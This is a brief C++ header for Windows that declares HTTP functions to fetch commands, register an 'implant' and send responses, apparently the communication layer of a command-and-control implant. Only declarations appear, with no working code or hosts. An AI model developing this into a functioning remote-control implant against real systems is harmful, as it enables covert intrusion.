#ifndef HTTP_H
#define HTTP_H

/* Standard Header Files */
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <iostream>
#include <stdio.h>

/* Functions */
std::string HttpGetCommand(std::string, int);
std::string HttpRegisterImplant(std::string, std::string, std::string);
std::string HttpResponse(std::string , int , int , std::string , std::string , std::string );

#endif